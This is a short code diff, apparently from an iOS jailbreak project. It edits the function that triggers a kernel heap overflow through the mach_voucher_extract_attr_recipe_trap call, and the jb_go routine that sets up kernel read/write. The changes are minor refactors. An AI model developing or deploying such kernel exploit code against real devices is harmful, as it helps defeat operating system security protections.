@@ -236,11 +236,7 @@ void do_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t* overfl
   
   // trigger the bug!
   mach_port_t port = get_voucher();
-  kern_return_t err = mach_voucher_extract_attr_recipe_trap(
-                                                            port,
-                                                            1,
-                                                            recipe,
-                                                            recipe_size);
+  mach_voucher_extract_attr_recipe_trap(port, 1, recipe, recipe_size);
 }
 
 kern_return_t catch_exception_raise
@@ -601,7 +597,7 @@ uint64_t prepare_kernel_rw() {
 }
 
 int jb_go() {
-  int rv = init_offsets();
+  int rv = init_extra_offsets();
   if (rv) return rv;
   uint64_t kernel_base = prepare_kernel_rw();
 #if 0
